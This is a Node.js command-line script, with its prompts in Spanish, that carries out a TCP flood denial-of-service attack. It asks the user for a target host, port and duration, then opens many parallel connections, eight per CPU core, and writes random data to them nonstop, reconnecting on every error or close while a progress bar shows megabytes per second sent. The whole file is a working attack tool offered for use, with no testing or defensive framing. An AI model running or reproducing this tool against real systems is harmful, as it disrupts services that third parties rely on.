#!/usr/bin/env node
'use strict';

const net      = require('net');
const crypto   = require('crypto');
const readline = require('readline');
const os       = require('os');
const dns      = require('dns').promises;

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const ask   = q => new Promise(r => rl.question(`\x1b[1;32m${q}\x1b[0m`, r));

let target, port, duration, cons = 0, bytes = 0, fail = 0, start;

(async () => {
  target   = await ask('Objetivo (IP/Dominio): ');
  if (!net.isIP(target)) target = (await dns.resolve4(target))[0];
  port     = parseInt(await ask('Puerto (1-65535): '));
  duration = parseInt(await ask('Duración (segundos): '));
  const cores = os.cpus().length || 1;
  const threads = cores * 8;          // agresivo
  console.log(`\n=== Resumen ===\nObjetivo: ${target}\nPuerto: ${port}\nDuración: ${duration}s\nHilos: ${threads}`);
  if ((await ask('¿Iniciar ataque? (s/n): ')).toLowerCase() !== 's') return process.exit(0);
  start = Date.now();
  attack(threads);
  ui();
  setTimeout(() => {
    console.log('\n\n\x1b[1;32mAtaque finalizado\x1b[0m');
    process.exit(0);
  }, duration * 1000);
})().catch(() => process.exit(1));

function attack(threads) {
  for (let i = 0; i < threads; i++) blast();
  function blast() {
    const s = net.connect(port, target, () => {
      s.setNoDelay(true);   // sin buffer interno
      flood(s);
    });
    s.on('error', () => { fail++; s.destroy(); blast(); });
    s.on('close', blast);
  }
}

function flood(socket) {
  const buf = crypto.randomBytes(4096);
  function write() {
    while (socket.write(buf, err => err && fail++)) {
      cons++; bytes += buf.length;
    }
    socket.once('drain', write);
  }
  write();
}

function ui() {
  const totalMB = () => (bytes / 1048576).toFixed(1);
  const bar = (p, w = 30) => '█'.repeat(Math.floor(p * w)) + '░'.repeat(w - Math.floor(p * w));
  const int = setInterval(() => {
    const elapsed = (Date.now() - start) / 1000;
    const pct = Math.min(100, (elapsed / duration) * 100);
    const mbps = (bytes / 1048576 / elapsed).toFixed(1);
    process.stdout.write(
      `\r\x1b[36m[${bar(pct / 100)}] \x1b[35m${pct.toFixed(0)}% ` +
      `\x1b[32m${mbps} MB/s \x1b[33m${totalMB()} MB \x1b[31m${fail} fail\x1b[0m`
    );
  }, 300);
  process.on('SIGINT', () => { clearInterval(int); console.log('\n\x1b[33mDetenido\x1b[0m'); process.exit(0); });
}
